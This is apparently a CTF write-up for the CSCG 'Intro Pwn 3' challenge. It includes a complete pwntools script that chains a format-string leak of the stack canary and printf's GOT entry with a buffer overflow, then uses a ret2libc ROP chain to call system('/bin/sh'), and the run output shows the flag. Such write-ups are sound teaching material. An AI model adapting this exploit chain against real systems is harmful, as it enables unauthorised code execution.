# Intro Pwn 3

Like in the other two Intro Pwn challenges we are given a binary and it's source code to work with.
There is not mutch different to the last challenge the only thing that changed is the `WINgardium_leviosa` function:
```c
void WINgardium_leviosa() {
    printf("They has discovered our secret, Nagini.\n");
    printf("It makes us vulnerable.\n");
    printf("We must deploy all our forces now to find them.\n");
    // system("/bin/sh") it's not that easy anymore.
}
```
It doesn't call `system` anymore and this might seem like a minor change, but is actually a lot more difficult now. Because the source code is almost the same like last time we can use the same strategy to gain rip control, but what do we do then. We cannot just call that one function, that will give us a shell. Of cause we could call `system` with the `/bin/sh` string, but for this to work we need to get the randomized address of `system`, because there is no plt entry for it (The code never uses the system function so the compiler didn't include a `system@plt`). If we want to call `system`, then we have to call the system function inside libc and we have to pass the `/bin/sh` string to it. And we can solve both of these problems in one go.

Let's say we have got the address of `printf` in the libc binary, then we could calculate the offset of it to `system`, but this only works if we have got the exact libc, that is used on the server and that's where the Dockerfile comes in.
We can pull up our own Docker image and check the libc used and I just hoped that it would work.

That's the plan, but this plan would only work if we got the actual address of some libc function in the binary, but how can we do this?

We have got a format string vulnerability in our binary, but we already "used" it to get a return pointer to defeat the random addresses for the main binary.
But as we have got rip control we can just call the `welcome` function, which introduces the bug, again.

But what do we do with a format expoit? We want to get the address of `printf` in the binary.

And here the `plt` comes in. The format string `%s` is used to print a string, but we can use it to read arbitrary memory. The fact, that the buffer, that is used in the `printf` is stored makes that possible.    

## The Plan


* We do the exploit from last time and get rip control.
* With that we call `welcome` to trigger the `gets` and `printf` again
* We input a string that looks like this `%XX$s <padding><address of printf@got.plt>`
* The result will be the data at `printf@got.plt`, which is the address of `printf` in libc.
* We then calculate the addresses of `system` and `/bin/sh` in the libc binary (yes the libc binary has the string `/bin/sh` in it)
* We use the `AAAAAAAA` function again to get rip control with a ropchain looking like this `<pop rdi><addr of binsh><addr of system>`
(The string argument of system is stored in rdi and every c binary has a `pop rdi` rop gadget)


## The Script


```python
from pwn import *


p = process("./pwn3")
#p = remote("hax1.allesctf.net",9102)



print(p.readline())

#p.sendline(b"CSCG{NOW_GET_VOLDEMORT}")
p.sendline(b"CSCG{THIS_IS_TEST_FLAG}")


print(p.readline())
p.sendline("|".join(["%p"]*85))
p.readline()
p.readline()
p.readline()
leaks = p.readline().decode("utf-8").split("|")

input()
cannery = p64(int(leaks[38],16))

leak_ret = int(leaks[40],16)
printf_got = leak_ret + 0x20121a

welcome =  leak_ret - 0x14f
ret =      leak_ret -  0x38
pop_rdi =  leak_ret +  0x75
AAAAAAAA = leak_ret -  0xc6

print(f"leaked ret : {hex(leak_ret)}")
print(f"printf {hex(printf_got)}")

#First rip control. Ropchain <welcome><AAAAAAAA>
p.sendline(b"Expelliarmus\0" +  b"A" * cyclic_find(b"cnaa") + cannery + p64(ret) + p64(ret) + p64(welcome) + p64(AAAAAAAA))

print(p.readline())
print(p.readline())

# Format string exploit again: we use `%s` to get the data at the address `printf_got`
p.sendline(b"%7$s" + b"\0" * 4 +  p64(printf_got))


print(p.readline())
print(p.readline())
p.readline()
printf = int.from_bytes(p.read(6), "little")

libc_base = printf - 0x0000000000064d70

system = libc_base + 0x00000000000554e0
bin_sh = libc_base + 0x1b6613

print(hex(printf))
print(hex(system))
print(hex(bin_sh))
print(hex(pop_rdi))
print(p.readline())

# Second ropchain `<pop_rdi><addr of binsh><system>` a lot of `ret`s to align the stack
p.sendline(b"Expelliarmus\0" +  b"A" * cyclic_find(b"cnaa") + cannery + p64(ret)+ p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(ret) +p64(ret)+p64(ret) + p64(system))

p.interactive()
```
And we get:
```bash
$ python pwnit.py
[+] Opening connection to hax1.allesctf.net on port 9102: Done
b'Enter the password of stage 2:\n'
b'+10 Points for Gryffindor!Enter your witch name:\n'

leaked ret : 0x55e79ae98d7e
printf 0x55e79b099f98
b'~ Protego!\n'
b'Enter your witch name:\n'
b'\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n'
b'\xe2\x94\x82 You are a Gryffindor! \xe2\x94\x82\n'
0x7f679aef6d70
0x7f679aee74e0
0x7f679b048613
0x55e79ae98df3
b' enter your magic spell:\n'
[*] Switching to interactive mode
~ Protego!
$ cat flag
CSCG{VOLDEMORT_DID_NOTHING_WRONG}
```

This was the last challenge that I solved in the CSCG and it is very rushed, I'm sorry if the writeup wan't that clear or if I forgot to explain something
